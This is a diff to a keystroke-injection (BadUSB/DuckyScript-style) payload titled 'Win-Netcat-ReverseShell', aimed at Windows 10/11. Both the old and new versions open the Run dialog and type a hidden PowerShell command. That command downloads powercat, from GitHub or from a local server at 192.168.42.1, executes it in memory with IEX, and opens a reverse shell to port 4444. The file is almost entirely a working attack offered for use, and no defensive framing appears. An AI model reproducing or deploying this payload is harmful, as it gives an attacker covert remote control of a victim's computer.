@@ -4,10 +4,18 @@ REM Xda-developer: @Kidpentester
 REM Title: Win-Netcat-ReverseShell
 REM Description: Downloads powercat via powershell and starts a reverse shell
 REM Target: Windows 10/11 
-REM VERSION: 1.2
+REM VERSION: 2
 
 GUI r
-DELAY 500
-STRING PowerShell.exe -WindowStyle Hidden -Command "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1') ;powercat -c <your machine ip> -p 4444 -e cmd"
+
+DELAY 250
+
+REM Adjust below value according to the script's name and the server's name
+REM Download official powercat from here: https://github.com/besimorhino/powercat
+
+STRING powershell -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.42.1:81/powercat');powercat -c 192.168.42.1 -p 4444 -e powershell"
+
+DELAY 250
+
 ENTER
-ENTER
+
